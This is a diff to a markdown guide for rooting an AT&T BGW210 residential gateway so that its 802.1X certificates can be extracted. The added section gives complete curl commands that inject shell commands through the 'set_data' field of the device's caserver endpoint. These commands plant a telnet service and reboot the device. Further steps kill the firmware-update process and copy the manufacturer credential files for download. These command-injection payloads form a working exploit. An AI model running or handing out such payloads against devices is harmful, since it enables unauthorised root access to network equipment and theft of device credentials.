@@ -24,17 +24,56 @@ The certificates extracted from both NVG589 and NVG599 work.
 - [BGW210](#bgw210)
 
 ### BGW210
-- Type `!`. It switches to root shell.
+Once downgraded, go to http://192.168.1.254/cgi-bin/ipalloc.ha , type your device access code to login, and assign a static IP to your PC that you'll be executing the CURL commands from.
+I assigned my PC: 192.168.1.70 since that's what the RG's DHCP-Server had assigned it.
+Once you assign a static IP,  refresh your PC's local ip address. using ifconfig, or ipconfig if on windows (cmd prompt: ipconfig /release and then ipconfig /renew). You may ignore this step if you assigned the same IPv4 it received by the DHCP-Server.
+Once that's done, open http://192.168.1.254/cgi-bin/ipalloc.ha and authenticate again if it asks.
+Once you authenticate, run these CURL commands (remember to navigate to cURL, see my video for help.
+(tech has no password when prompted)
+
+curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
+ 
+curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -a /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
+ 
+curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -s|" -v --http1.1 https://192.168.1.254:49955/caserver
+ 
+curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| reboot|" -v --http1.1 https://192.168.1.254:49955/caserver
+ 
+The AT&T RG (BGW210) will reboot after the final command, and you'll be able to telnet on port 28 as admin w/ device access code as the password once it reboots. 
+
+(Use Putty if using a Windows PC)
+ 
+Once you're logged in via telnet, type ! and press enter to elevate to a root sh terminal
+
+Now, type top and let the telnet terminal populate with the running processes of the RG.
+
+Once the top command displays all of the running process, look for a process labelled:   
+/usr/bin/udpsvd -E 0 69 tftpd /lib/firmware
+
+Press CTRL + C to break out of the top command.
+
+Type kill PID_number_of_udpsvd; 
+For example: kill 1048 (in the video I mistook the other four digit number for the PIV by mistake initially, then corrected myself).
+
+This kills the auto update script so that you can make changes, or copy your 802.11x certificates without the ATT firmware automatically updating when you aren't ready for it. Not really as important if you don't have the RG connected to the ONT (I didn't in the video).
 
 #### Extract Certificates
-- In BGW210, run the following commands in order. Make sure you are in root shell.
+- In BGW210, run the following commands in order. Make sure you are in root shell. Reminder - Type `!`. It switches to root shell.
   ```
+  mount -o remount,rw /dev/ubi0 /  
   mount mtd:mfg -t jffs2 /mfg
+  cp /mfg/mfg.dat /www/att/mfg.dat
+  mount mtd:mfg -t jffs2 /mfg
+  Download: http://192.168.1.254/mfg.dat
+  
+  ## Next:
+  
   cd /tmp
   tar cf cert.tar /etc/rootcert/
   cp cert.tar /www/att/images
+  Download: http://192.168.1.254/images/cert.tar
   ```
-- Download http://192.168.1.254/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.
+- Reminder: Download http://192.168.1.254/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.
 
 
 [Back to menu](#menu)
